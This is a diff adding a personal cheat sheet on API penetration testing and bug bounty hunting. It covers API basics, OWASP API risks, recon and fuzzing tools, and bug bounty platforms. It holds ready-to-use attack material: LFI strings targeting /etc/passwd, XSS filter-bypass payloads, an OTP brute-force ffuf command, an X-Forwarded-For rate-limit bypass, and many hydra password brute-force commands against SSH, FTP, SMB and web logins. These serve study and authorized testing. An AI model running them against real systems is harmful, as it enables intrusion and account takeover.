@@ -1,0 +1,446 @@
+API Pentration Testing:
+
+* What is API pentrarion testing?
+* Importance of API pentesting
+* List of API vulnerabilities
+* Requirement to learn API Pen-Testing
+
+Indroduction:
+* API Pentesting is a one type of pentration testing where a pen-tester trying to find out the vulnerabilities of API.
+* Exploit API vulnerabilities such as injection attack, BOLA, BFLA etc
+
+Importance of API Pentesting:
+* Security Assurance
+* Protection Sensitive data
+* Reputation and trust
+* Business Continutiy
+
+Types of API Vulnerability:
+
+* Broken Object Level Authorization - BOLA
+* Broken Function Level Authorization -  BFLA
+* Security Misconfiguration
+* Mass Assignment
+* Code Injection
+* Broken User Authentication
+* Exeessive data exposure
+* Improper asset management
+* insufficient logging and monitoring
+
+* Common Directory: /api, /api/v1, /v1, /v2, /v3, /rest, /swagger, /swagger.json, /doc, /docs, /graphql, /graphiql, /altair, /playground
+* Default parameter: page, name, user, if, id, ID
+* Port Scanning: nmap -sV -sC -T4 <ip> --script vuln -Pn
+* Fuzzing: ffuf -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt -u http://<ip/link>/api/FUZZ -fs <size_number> -v
+ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u http://<ip/link>/?FUZZ=1 -fs <size_number> -v
+Burp: intercept > repeater > intruder > target the real parameter and find it > target list > disable url encode > attack
+Use paramminer in burpsuite
+
+* If you go to any link but you donot find any content directory fuzzing here
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt -u http://<ip/link>/FUZZ -mc 200 -v
+ffuf -w /usr/share/seclists/Discovery/Web-Content/common-api-endpoints-mazen160.txt -u http://<ip/link>/api/FUZZ -mc 200 -v
+ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-large-files-lowercase.txt -u http://<ip/link>/api/download/FUZZ -mc 200 -v
+LFI: use url encoding
+/../etc/passwd
+/../../etc/passwd
+/....//etc/passwd
+/....//..../etc/passwd
+
+
+XSS: If any input or search relected in website you are trying XSS and SSTI. you can using url encoding or double url encoding for xss filter bypass
+<img src=x onerror=alert(1)>
+#"><img src=M onerror=alert('XSS');>
+element[attribute='<img src=x onerror=alert('XSS');>
+<image/src/onerror=prompt(8)>
+<img/src/onerror=prompt(8)>
+<image src/onerror=prompt(8)>
+<img src/onerror=prompt(8)>
+<image src =q onerror=prompt(8)>
+<img src =q onerror=prompt(8)>
+</scrip</script>t><img src =q onerror=prompt(8)>
+
+* What is API
+* Types of API
+* Types of Web API Architechture and Protocols
+* Restful APIs
+* GraphQL APIs
+* SOAP APIs
+* Restful API vs SOAP Apis
+
+What is API: API stands for Application Programming Interface. It provides a computer-friendly method for interacting between client and server. API acts as a bridge that enables different applications, services, or platforms to interact with each other, share information, and perform specific tasks. using web, Mobile App, Cloud Computing and more
+
+Types of API: 
+Private APIs: Private APIs are internal to an enterprise and only used for connecting systems and data within the business.
+Public APIs: They are open to the public and may be used by anyone. There may not be some authorization and cast associated with these types of APIs.
+Partner Apis: These are only accessible by authorized external developers to aid business-to-business partnerships.
+Composite APIs: These combine two or more different APIs to address complex system requirements or behaviors.
+
+Http Methods:
+GET : The GET method requests a representation of the specified resource. Requests using GET should only retrieve data.
+HEAD : The HEAD method asks for a response identical to a GET request, but without the response body.
+POST : The POST method submits an entity to the specified resource, often causing a change in state or side effects on the server.
+PUT : The PUT method replaces all current representations of the target resource with the request payload.[update]
+DELETE : The DELETE method deletes the specified resource.
+CONNECT : The CONNECT method establishes a tunnel to the server identified by the target resource.
+OPTIONS : The OPTIONS method describes the communication options for the target resource.
+TRACE : The TRACE method performs a message loop-back test along the path to the target resource.
+PATCH : The PATCH method applies partial modifications to a resource.
+
+Restful API: Rest stands for Representational State Transfer. Restful API is commonly used in web development to build scalable and efficient web services. Restful APIs provided a standardized and scalable approachl building web services then can be consumed by various client access different platforms. this is stateless and this is kind server. this is interface GET,PUT,POST,DELETE. This is Cacheable and layerred System and JSON or XML Format.
+
+
+* POST	* PUT	* Delete
+POST /api/books
+Content-Type: application/json
+{
+     "title" : "Who am i",
+     "Author": "Mr. X",
+     "year" : 1925
+}
+	PUT /api/books/{id}
+Content-Type: application/json
+{
+      "title" : "Who are you"
+}	DELETE /api/books/{id}
+SOAP API: SOAP stands for Simple object Access Protocol . It is a protocol for exchanging structured information in web services. XML based messaging. .SOAP can be used over various protocols such as HTTP, SMTP, and more although it is most commonly used with HTTP or HTTPS
+
+ 
+
+GraphQL API: GraphQL API is an API design approach, and Query Languages developed. each previous effective and efficient way to request it and manipulate data from the server. The graph QL API uses SQL to define the schema, which describes the types of data available and the relationships between them, unlike RESTful API that often require multiple endpoints for different resources, GraphQL APIs typically have a single infant to accept all the querties and mutations. 
+Difference Between APIS:
+ 
+
+OutLine:
+
+* What is JSON
+* Basic Idea about JSON
+* How JSON works in API
+* What is XML
+* vasic idea about XML
+
+What is JSON: JSON stands for Java-Script Object Notation. It is Lightweight data interchange format that is easy for humans to read and write and easy for machines to parse to read and write and easy for machine to parse and generate. It is widely used for transmitting data between a server and a web application. It is often as a alternative of XML.
+
+Structure: Object and Arrays are main components of JSON data structure.
+
+
+JSON is API:
+
+* API request
+* API server processing
+* Data Representation
+* JSON Response
+* API Response
+
+XML:
+
+XML stands for extensible markup language. XML allows users to define their own customized markup tags, making it highly flexible and adaptable to different data structures. It is widely used for structuring and storing data in a hierarchical format. Data is enclosed with opening and closing tags, forming an element.
+
+XML in API:
+
+* API request 
+* XML Data Format
+* API server processing
+* XML response
+* API response Handling
+
+
+OWASP TOP 10 API Security RISKS
+
+OutLine:
+
+* Owasp Top 10 API Security Risk 2023
+* Owasp Top 10 API Security Risk 2021
+* Difference between them
+* Overview of Owasp top 10 API security Risk 2023
+* Broken Object Level Authorization
+* Practical Hands on BOLA
+
+Authentication vs Authorization
+
+Authentication: Who are you?
+Authorization: What's your permission?
+Broken Object Level Authorization (BOLA): BOLA is one of the most prevalent and severe vulnerabilities for APIs. Bola vulnerabilities occur when an API provider does not have sufficient controls in place to enforce authorization. API users should only have access to sensitive resources that belong to them. When BOLA is present, an attacker will be able to access the sensitive data of other users.
+Description: APIs tend to expose endpoints that handle object identifiers, creating a wide-attack surface-level access control issue. Object-level authorization checks should be considered in every function that accesses a data source using input from the user.
+
+Methadology:  Intercept with the burp, then analyze the response and request. If you find any API and if you find IDOR type, You can try IDOR.
+* Change to v1/v2/v3 you may find something
+
+OUTLINE:
+* API Pentration Testing Methodology
+* API Recon
+* API Documentation
+* Discovering API Documentation
+* Discovery of API Hidden Endpoints and Parameters
+* Practical Hands-On API Pentetration Testing
+
+API Recon:
+* API Recon: API recon is the first phase in API Pentration testing. As a penetration tester, you need to find out the essential information about the API.
+* Recon Focus: API Key Exposure, Documentation File Exposure, API Path Exposure, Sensitive Data Exposure, Endpoint Exposure, etc.
+* Discovering hidden content, endpoints, and parameters.
+
+
+API Penetration Testing Methodology:
+* Find out API-related information such as API path location, documentation of API, etc.
+* Analysis of API endpoints and understanding of API features
+* Check the allow methods and try to use the features of the allow methods of manipulation in the API
+* If your target API is a Restful API, then try to manipulate it by adding a new object according to JSON or XML syntax.
+* Understand the functionality of API requests and responses and try to exploit it in various ways.
+
+API Pentesting Methadology:
+* Intercept with Burp and analyze history
+* Find the API request
+* Use options, and you will know what is approaching. Use those manually..
+* Sometime you may change or add a header 
+* If you are using Content-Type: application/json,. You must use the JSON code format.
+* Check the error message, and you must search Google and bypass it.
+* You can change v1/v2/v3 and other common directories using ffuf also.
+Use Those for more hunting BurpBounty Pro, Pentest Mapper, BurpJSLinkFinder, JSON Web Tokens
+
+Method:
+* Detect your target
+* Use Ping
+* use nmap : nmap -sV -sC -T4 <ip> --script=vuln -Pn
+* use rustscan : rustscan a <ip> 
+* analyze the result and go forward and API page must be blank page
+* use your right wordlists
+* Try XSS in email and password field : test@<img src=x onerror=alert(1)>
+* inspect > network > XHR
+* Analyze your target and http history
+* use Extention > Burp Bounty Pro > Active Scan > You can choose ay thing
+* If you find xml in burpsuite try XXE
+* If you see that "you are exceeded the number of attempts" then you can try X-Forwarded-For
+* If you see that "you are exceeded the number of attempts" then bruteforce the OTP and you can change version in API 
+bruteforce : Burp and fuzz
+
+Burp > go to intruder and select you target and set the payload then start
+ffuf -w <4 digit wordlist> -w <link> -H "Content-Type: application/json" -X POST -d '{json formrt form intercepting burpsuite}'
+ffuf -w 4-digits-0000-9999.txt -w 127.0.0.1/identity/api/auth/v2/check-otp -H "Content-Type: application/json" -X POST -d '{"email":"abc@gmail.com","otp":"FUZZ","password":"pass@word"}'
+
+
+>> First Intercept with burp and json format you are finding email, otp, pass etc. so we are editing in JSON format.
+{
+	"email:"abc@gmail.com",
+	"otp":"FUZZ",
+	"password":"abcd"
+}
+>> After editing save it as a txt file
+>> ffuf -request req.txt -request-proto http -w /usr/share/seclists/Passwords/any txt file -fs <file size> 
+>> ffuf -request req.txt -request-proto http -w /usr/share/seclists/Passwords/any txt file -mc 200
+
+
+
+
+
+
+
+
+
+
+Bug Hunting:
+
+--> What is Bug Hunting
+--> Platform for Bug Hunting
+--> Types of Program in Hunting
+--> How to Create Bug hunting AC
+
+Bug Hunting:
+--> Bug Bounty is a cyber security program where bug hunter try to find out the  valid bugs that may be harmful for the company
+--> For the valid bugs, bug hunter get reputations from the company and some programs give them handsome payment(reword) that's called bounty
+--> Every bug bounty program has some rules and regulations with scope. Hunter need to finding the bug occording to program rules nd regulations
+--> After found a valid bug, hunter need to submit the report with POC
+
+Plartforms for Bug Bounty:
+Hackerone, Yes We Hack, Intigriti, BugCrowd, Synack, Yogosha, HackenProof, SecureBug
+
+Types of Bug Bounty Program:
+--> VRP/BBP -- Vunerability Reward Program
+--> VDP -- Vunerability Disclosure Program
+--> RDP -- Responsible Disclosure Program
+
+Traditional Bug Hunting Method:
+Bug Hunting Start > CIDR > IP > PortScan/ASN/Geo IP
+Bug Hunting Start > Domain > SubDomain > DNS/Finger Print/Content Discovery/JS files COllect ad Analysis
+
+Bug Hunting Tips:
+--> Set your Mindset
+--> Target newly Launched Program
+--> Target Provate Program
+--> If you are beginner, Please Start bug hunting journey with rdp/vdp program and focus on the reputations not for the bounty
+--> Increase the reputations via finding valid bugs in rdp/vdp programs that can help you to get more private programs invitation
+--> Monitor for any changes in program's scopes by enabling bell icon on all programs that you did bounting
+--> Always check report of target programs in programs hacktivity
+
+Live Hunting:
+
+Domain information:
+https://shoda.io
+https://hunter.io
+https://hunter.how
+https://whois.domaintools.com/
+https://www.intodns.com/
+https://www.sslshopper.com/ssl-checker.html
+https://mxtoolbox.com/
+https://viewdns.info/
+https://search.censys.io/
+ https://securitytrails.com/ 
+
+Subdomain Enum:
+https://osint.sh/subdomain/
+https://subdomainfinder.c99.nl/
+ https://crt.sh
+
+subdomain + Sub + Subdomain:
+Tools : subfinder, amass, ffuf(BruteForce), assetfnider, sublist, altdns, Knockpy, 
+Resolve : httpx/dnsx, httptoolkit
+Screenshot : Eyewitness, Gowitness, HTTPscreenshot
+Discovery : Gobuster, dirsearch, dirb, wfuzz 
+MassScan : nmap, rustscan
+Recon: buildtwith, censys, google dorks, github dorks, shodan, whatcms
+
+subdomains : subfinder, dnscan, crt.sh, assetfinder, amass, ffuf
+duplicate Remove : sorting
+alive subdomains : httpx/dnsx
+
+domain >> subdomains >> dublicate remove(unique) >> alive subdomains
+
+Ref:
+https://medium.com/@cicadasec/all-time-best-tools-for-bug-hunting-da18183a3598
+https://github.com/vavkamil/awesome-bugbounty-tools
+https://github.com/nahamsec/Resources-for-Beginner-Bug-Bounty-Hunters/blob/master/assets/tools.md
+https://infosecwriteups.com/bug-bounty-tool-list-32262271f1e4
+
+nmap -sV -sC --script=vuln <ip>
+nmap -sV <ip>
+sudo nano /etc/hosts
+
+Recon Bash Script:
+https://github.com/venom26/recon/blob/master/ultimate_recon.sh
+https://github.com/venom26/recon-in-bash
+
+go install -v github.com/LukaSikic/subzy@latestgo install -v 
+sudo cp ~/go/bin/subzy /bin/
+subzy -h
+subzy run --targets list.txt
+subzy run --target http://testphp.vulnweb.com
+subzy run --target http://testphp.vulnweb.com,test.google.com,https://test.yahoo.com
+
+(Subdomain takeover) : https://medium.com/@jeetpal2007/my-first-bounty-ever-from-bug-hunting-worth-100-subdomain-takeover-8047f2588b4f
+https://blackangel1.medium.com/how-to-find-subdomain-takeover-vulnerability-abe9906793ec
+
+subfinder -d example.com -v -o example_subdomain.txt
+Subzy run --targets example_subdomain.txt --hide_fails
+
+Best Tools : https://github.com/j3ssie/osmedeus
+Open Redirect: link//google.com
+Open Redirect: https://hackerone.com/reports/692154
+
+--Wordpress--
+
+Source : https://github.com/foysalhossain12/Hacking-Wordpress
+wpscan --url <link> --enumerate --random-user-agent --api-token <api>
+
+--Joomla--
+
+Common Directory:
+
+README.txt >> joomla version, Change Log
+manifests/files/joomla.txt 
+
+/administrator
+/bin/
+/cache/
+/cli/
+/components/
+/includes/
+/installation/
+/language/
+/layouts/
+/libraries/
+/logs/
+/modules/
+/plugins/
+/tmp/
+
+Recon : wappalyzer, source code, fuzzing
+
+Scanning : 
+dirsearch
+https://hackertarget.com/joomla-security-scan/
+https://www.kali.org/tools/joomscan/
+https://github.com/drego85/JoomlaScan
+https://github.com/OWASP/joomscan
+https://github.com/ajnik/joomla-bruteforce
+
+
+More Report : forget password bug hackerone report
+
+--Drupal--
+
+Scanner:
+https://hackertarget.com/drupal-security-scan/
+https://github.com/SamJoan/droopescan
+
+
+--Hunting Report--
+
+Summary:
+
+Description:
+
+Steps to Reproduce:
+
+POC: img + video
+
+Reference:
+
+Impact:
+
+Recommended:
+
+
+--VAPT--
+
+VA >> Vulnerability Assesment
+Tools >> Nessus, Acunetix, OpenVAS, Nuclei, Qualys, Nexpose (Rapid 7), zap, Burp Bounty pro
+PT >> Penetration Testing(Automation + Manual)
+Tools >> BurpSuite Pro, Kali Linux, MetaSploit
+
+
+
+
+Hydra:
+
+
+hydra -l username-p password.txt <server> <service>
+hydra -l molly -p butterfly 10.10.137.76 ssh
+hydra -l molly -p butterfly ssh::/localhost
+hydra -l molly -P rockyou.txt -f localhost ssh
+hydra -l molly -P rockyou.txt -f localhost http-get
+hydra -l user -P passwords.txt IP_VICTIM ssh
+hydra -l user -P passwords.txt IP_VICTIM ftp
+hydra -l user -P passwords.txt IP_VICTIM smb
+hydra -L users.txt -p butterfly 10.10.137.76 ssh
+hydra -L users.txt -P rockyou.txt 1010.137.76 ssh
+hydra -l username -p password <ip> <service> -o <file.txt>
+hydra -l username -p password <ip> <service> -s <port>
+hydra -l <username> -p <password> -M <host_file.txt> <service>
+hydra -L <username_file> -P <password_file> <target>
+hydra -L users.txt -P passwords.txt http-get://example.com/
+hydra -L users.txt -P passwords.txt http-post-form "/login.php:user=^USER^&password=^PASS^:Invalid Login" -V
+hydra -l admin -P /usr/share/wordlists/rockyou.txt -f -V example.com http-post-form "/login.php:user=^USER^&password=^PASS^:Invalid Login"
+hydra -l user -P pin_codes.txt http-post-form "/login.php:user=^USER^&pin=^PASS^:Invalid PIN" -V
+
+https://www.freecodecamp.org/news/how-to-use-hydra-pentesting-tutorial/
+https://pawanjswal.medium.com/hydra-unveiling-the-power-of-brute-force-in-web-page-login-security-6e8aa90a7013
+https://www.techtarget.com/searchsecurity/tutorial/How-to-use-the-Hydra-password-cracking-tool
+https://medium.com/@s12deff/hydra-bruteforce-9d81a611e2c8
+
+
+
+
+
+
+
+
+
+
+
